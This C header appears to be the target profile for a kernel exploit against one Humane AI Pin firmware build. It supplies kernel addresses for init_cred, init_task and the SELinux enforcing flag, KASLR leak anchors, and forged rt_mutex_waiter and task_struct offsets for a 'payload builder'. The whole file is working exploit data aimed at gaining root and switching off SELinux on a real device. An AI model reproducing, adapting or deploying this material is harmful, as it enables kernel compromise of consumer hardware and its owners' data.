/*
 * Humane AI Pin retail 101.000065.40.20 target profile.
 *
 * Full OTA boot.img SHA-256:
 *   732c25edd6d041c654f4d9b14a2bdbb3bfdbde8aeb0629776f34656d4adc5fd8
 * Extracted arm64 Image SHA-256:
 *   6bf59040920087b99d2a78c7d7469a152456952662347c791e1f6913cd1fef1e.
 *
 * The addresses below are link-time image addresses.  Runtime image
 * addresses are formed only after the KASLR slide has been recovered.
 */
#ifndef TARGET_065_40_H
#define TARGET_065_40_H

/* Target profile recovered from boot_a/boot_b and xbl_config. */
#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
#define P0_PAGE_OFFSET 0xffffffc000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
/* Live /proc/iomem: a1280000-a2f6ffff : Kernel code. */
#define P0_KERNEL_PHYS_LOAD 0xa1280000ULL

/* Refuse to run pointer writes on an unprofiled retail/different kernel. */
#define TARGET_KERNEL_RELEASE "Linux version 4.14.190-perf"
#define TARGET_SLOT_A_VERSION_MARKER "Wed Nov 29 15:51:06 PST 2023"
#define TARGET_SLOT_B_VERSION_MARKER "Wed Nov 29 15:51:06 PST 2023"

/* Retained for the legacy pselect geometry checker. */
#define PSELECT_WAITER_WORD_SHIFT 16

/* Kernel image addresses shared by both EDL slots. */
#define INIT_TASK 0xffffff8009b9d680ULL
#define INIT_CRED 0xffffff8009bac878ULL
#define ENTRY_TASK 0xffffff80099650b0ULL
#define PER_CPU_OFFSET 0xffffff8009b8f1f0ULL
#define ROOT_TASK_GROUP 0xffffff8009d3df00ULL

/* struct selinux_state begins with initialized, enforcing (two bools). */
#define SELINUX_ENFORCING 0xffffff800a215001ULL

/*
 * KASLR side-channel anchors (slot-a link-time image addresses).
 *
 * SLIDE_LOGGERS_0_1_IMAGE = &loggers[0][1] (nf_log.c static 2D array,
 * stride NFPROTO*16 + type*8): zero-init .bss, filled at boot by
 * nf_log_register(NFPROTO_UNSPEC, &nfulnl_logger) whose logger->type is
 * NF_LOG_TYPE_ULOG(1) -> loggers[pf][1] = &nfulnl_logger for every pf.
 *
 * SLIDE_RANDOM_BOOT_ID_DATA_IMAGE = &random_table[5].data (entry 5 is
 * "boot_id", .data at entry+8, 0x40-byte ctl_table stride).  Its RELA.dyn
 * entry (r_offset 0xa4a34e8, addend &sysctl_bootid 0xa71af90) proves the
 * slot; proc_do_uuid() re-reads table->data at every read.
 * The previous value 0xa1cb720 was a .rela.dyn addend quad, not a sysctl
 * slot (see fleet/leak-math.md).
 */
#define SLIDE_NFULNL_LOGGER_IMAGE 0xffffff8009b932e8ULL
#define SLIDE_LOGGERS_0_1_IMAGE 0xffffff8009b93210ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffff8009c3d578ULL
/* Link-time image offset of nfulnl_logger, used by the boot_id decode. */
#define P0_NFULNL_LOGGER_IMAGE_OFF \
  (SLIDE_NFULNL_LOGGER_IMAGE - KIMAGE_TEXT_BASE)

/*
 * Tracefs fallback slide source (sched_blocked_reason wchan leak):
 * worker_thread sleeps via schedule(); the blocked_reason tracer records
 * get_wchan() = the return site right after `bl schedule` at
 * 0xffffff80080f07fc, i.e. image offset 0x70800.  Event id read from
 * /sys/kernel/tracing/events/sched/sched_blocked_reason/id on the dev
 * unit (74).
 */
#define SLIDE_TRACEFS_EVENT_ID 74
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x61494ULL

/* Vendor 4.14 rt_mutex_waiter (0x50 bytes; no wake_state or ww_ctx). */
#define WAITER_TREE_ENTRY_OFF 0x0
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48
#define TARGET_WAITER_SIZE 0x50
#define TARGET_HAS_WAITER_WAKE_STATE 0
#define TARGET_HAS_WAITER_WW_CTX 0

/* Fake waiter aliases used by the shared payload builder. */
#define FAKE_WAITER_PI_TREE_ENTRY_OFF WAITER_PI_TREE_ENTRY_OFF
#define FAKE_WAITER_PI_TREE_PRIO_OFF WAITER_PRIO_OFF
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF WAITER_DEADLINE_OFF

/* task_struct offsets proven from the EDL vmlinux. */
#define FAKE_TASK_USAGE_OFF 0x70
#define FAKE_TASK_PRIO_OFF 0xb0
#define FAKE_TASK_NORMAL_PRIO_OFF 0xb8
#define FAKE_TASK_TASK_GROUP_OFF 0x3e8
#define FAKE_TASK_PI_LOCK_OFF 0x8c4
#define FAKE_TASK_PI_WAITERS_OFF 0x8d0
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8e0
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8e8
#define TARGET_HAS_UCLAMP 0

/* task_struct credential pointers. */
#define TASK_REAL_CRED_OFF 0x7f8
#define TASK_CRED_OFF 0x800

#endif
